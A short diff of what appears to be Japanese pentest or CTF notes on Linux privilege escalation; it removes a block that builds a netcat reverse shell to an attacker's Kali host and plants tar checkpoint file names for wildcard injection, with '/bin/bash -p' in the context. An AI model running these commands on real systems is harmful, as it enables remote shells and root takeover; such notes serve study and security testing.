@@ -23,14 +23,6 @@
     /bin/bash -p
 ```
 
-``` shell
-    #wildcard injection でのrevearse shell
-    echo "#!/bin/bash" > shell.sh
-    echo "nc <kaliのip> <port> -e /bin/bash" >> shell.sh
-    touch -- '--checkpoint=1'
-    touch -- '--cheackpoint-action=exec=sh shell.sh'
-```
-
 ## findで権限昇格
 
 ``` shell
